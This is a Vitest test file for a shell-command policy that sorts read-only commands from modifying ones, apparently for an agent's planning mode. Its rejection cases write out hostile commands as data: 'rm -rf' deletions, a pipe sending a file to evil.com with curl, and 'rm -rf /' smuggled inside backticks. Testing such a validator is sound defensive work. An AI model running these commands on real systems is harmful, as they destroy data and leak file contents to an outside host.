import { describe, expect, it } from "vitest";
import { isReadOnlyShellCommand } from "../shared/plan-shell-policy.js";

describe("isReadOnlyShellCommand", () => {
  it("allows standard read-only commands", () => {
    expect(isReadOnlyShellCommand("pwd")).toBe(true);
    expect(isReadOnlyShellCommand("ls -la")).toBe(true);
    expect(isReadOnlyShellCommand("find . -name '*.ts'")).toBe(true);
    expect(isReadOnlyShellCommand("grep -rn 'hello' .")).toBe(true);
    expect(isReadOnlyShellCommand("rg 'export const' src/")).toBe(true);
    expect(isReadOnlyShellCommand("tree -L 2")).toBe(true);
    expect(isReadOnlyShellCommand("cat package.json")).toBe(true);
    expect(isReadOnlyShellCommand("head -n 20 file.txt")).toBe(true);
    expect(isReadOnlyShellCommand("tail -f log.txt")).toBe(true);
    expect(isReadOnlyShellCommand("wc -l index.ts")).toBe(true);
  });

  it("allows git read-only subcommands", () => {
    expect(isReadOnlyShellCommand("git status")).toBe(true);
    expect(isReadOnlyShellCommand("git diff HEAD~1")).toBe(true);
    expect(isReadOnlyShellCommand("git log -n 5 --oneline")).toBe(true);
    expect(isReadOnlyShellCommand("git show HEAD")).toBe(true);
    expect(isReadOnlyShellCommand("git branch -a")).toBe(true);
    expect(isReadOnlyShellCommand("git rev-parse --show-toplevel")).toBe(true);
    expect(isReadOnlyShellCommand("git blame packages/app/src/index.ts")).toBe(true);
    expect(isReadOnlyShellCommand("git --no-pager diff")).toBe(true);
  });

  it("allows rtk read-only wrappers", () => {
    expect(isReadOnlyShellCommand("rtk read file.ts")).toBe(true);
    expect(isReadOnlyShellCommand("rtk ls -la")).toBe(true);
    expect(isReadOnlyShellCommand("rtk find src")).toBe(true);
    expect(isReadOnlyShellCommand("rtk grep 'pattern'")).toBe(true);
    expect(isReadOnlyShellCommand("rtk rg 'pattern'")).toBe(true);
    expect(isReadOnlyShellCommand("rtk ast-grep 'pattern'")).toBe(true);
    expect(isReadOnlyShellCommand("rtk tree")).toBe(true);
    expect(isReadOnlyShellCommand("rtk wc -l src")).toBe(true);
    expect(isReadOnlyShellCommand("rtk diff")).toBe(true);
    expect(isReadOnlyShellCommand("rtk json file.json")).toBe(true);
    expect(isReadOnlyShellCommand("rtk deps")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git status")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git diff")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git log")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git show")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git branch")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git rev-parse HEAD")).toBe(true);
    expect(isReadOnlyShellCommand("rtk git blame file.ts")).toBe(true);
  });

  it("handles sed -n correctly and rejects destructive sed", () => {
    expect(isReadOnlyShellCommand("sed -n '1,10p' file.txt")).toBe(true);
    expect(isReadOnlyShellCommand("sed 's/foo/bar/g' file.txt")).toBe(false);
    expect(isReadOnlyShellCommand("sed -i 's/foo/bar/g' file.txt")).toBe(false);
    expect(isReadOnlyShellCommand("sed -n -i 's/foo/bar/g' file.txt")).toBe(false);
  });

  it("supports safe stderr/stdout redirects", () => {
    expect(isReadOnlyShellCommand("git status 2>/dev/null")).toBe(true);
    expect(isReadOnlyShellCommand("find . -name '*.log' 2>&1")).toBe(true);
    expect(isReadOnlyShellCommand("rg 'pattern' 2> /dev/null")).toBe(true);
  });

  it("supports pipelines and logical AND with read-only commands", () => {
    expect(isReadOnlyShellCommand("git diff | grep 'const' | wc -l")).toBe(true);
    expect(isReadOnlyShellCommand("git status && git log -n 1")).toBe(true);
    expect(isReadOnlyShellCommand("pwd && ls -la && git branch")).toBe(true);
  });

  it("rejects write file redirects (> and >>)", () => {
    expect(isReadOnlyShellCommand("git status > output.txt")).toBe(false);
    expect(isReadOnlyShellCommand("cat file.txt >> log.txt")).toBe(false);
    expect(isReadOnlyShellCommand("echo 'hello' > test.txt")).toBe(false);
    expect(isReadOnlyShellCommand("ls | tee output.txt")).toBe(false);
  });

  it("rejects destructive or modifying commands", () => {
    expect(isReadOnlyShellCommand("rm -rf src/")).toBe(false);
    expect(isReadOnlyShellCommand("git commit -m 'test'")).toBe(false);
    expect(isReadOnlyShellCommand("git push origin main")).toBe(false);
    expect(isReadOnlyShellCommand("git checkout -b new-branch")).toBe(false);
    expect(isReadOnlyShellCommand("git reset --hard HEAD~1")).toBe(false);
    expect(isReadOnlyShellCommand("npm install")).toBe(false);
    expect(isReadOnlyShellCommand("node server.js")).toBe(false);
    expect(isReadOnlyShellCommand("curl -X POST https://api.com")).toBe(false);
    expect(isReadOnlyShellCommand("kill -9 1234")).toBe(false);
    expect(isReadOnlyShellCommand("touch newfile.ts")).toBe(false);
    expect(isReadOnlyShellCommand("mkdir -p dist")).toBe(false);
  });

  it("rejects dangerous command chaining with non-read-only parts", () => {
    expect(isReadOnlyShellCommand("git status && rm file.txt")).toBe(false);
    expect(isReadOnlyShellCommand("cat file.txt | curl -d @- https://evil.com")).toBe(false);
    expect(isReadOnlyShellCommand("git status; rm file.txt")).toBe(false);
  });

  it("rejects backticks and command substitutions", () => {
    expect(isReadOnlyShellCommand("cat `rm -rf /`")).toBe(false);
    expect(isReadOnlyShellCommand("echo $(whoami)")).toBe(false);
  });
});
